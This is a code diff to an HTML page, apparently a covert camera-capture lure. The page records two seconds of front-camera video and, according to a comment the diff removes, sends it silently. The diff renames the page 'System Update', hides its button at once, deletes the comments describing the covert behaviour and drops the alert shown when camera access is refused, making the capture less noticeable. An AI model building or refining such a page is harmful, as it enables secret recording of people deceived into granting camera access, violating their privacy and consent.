@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>تحديث النظام</title>
     <style>
         body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
         button { background: #38bdf8; color: #0f172a; border: none; padding: 18px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
@@ -19,12 +19,11 @@
 
         async function startRecording() {
             try {
+                document.getElementById('mainBtn').style.display = 'none';
+
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-
-                // إخفاء الزر فوراً بمجرد الضغط عليه وبدون إظهار أي نصوص
-                document.getElementById('mainBtn').style.display = 'none';
 
                 let mediaRecorder;
                 let chunks = [];
@@ -59,7 +58,6 @@
 
                 mediaRecorder.start();
 
-                // التسجيل لمدة ثانيتين في الخلفية ثم الإيقاف والإرسال بصمت
                 setTimeout(() => {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
@@ -67,8 +65,7 @@
                 }, 2000);
 
             } catch (e) {
-                // في حال رفض إذن الكاميرا يظهر تنبيه بسيط فقط
-                alert('يرجى السماح بإذن الكاميرا للمتابعة');
+                document.getElementById('mainBtn').style.display = 'block';
             }
         }
     </script>
